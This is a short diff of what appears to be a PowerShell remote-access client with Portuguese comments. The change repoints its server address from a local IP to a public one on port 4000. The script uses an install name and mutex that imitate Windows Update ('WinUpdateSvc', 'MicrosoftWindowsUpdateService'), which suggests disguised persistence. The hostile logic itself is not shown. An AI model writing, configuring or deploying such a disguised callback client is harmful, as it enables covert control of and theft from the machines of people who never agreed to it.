@@ -8,7 +8,7 @@ Versão: 10.0.19045.1 - Ultimate Edition
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
+$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -1004,3 +1004,4 @@ while ($true) {
 
 $mutex.ReleaseMutex()
 $mutex.Dispose()
+
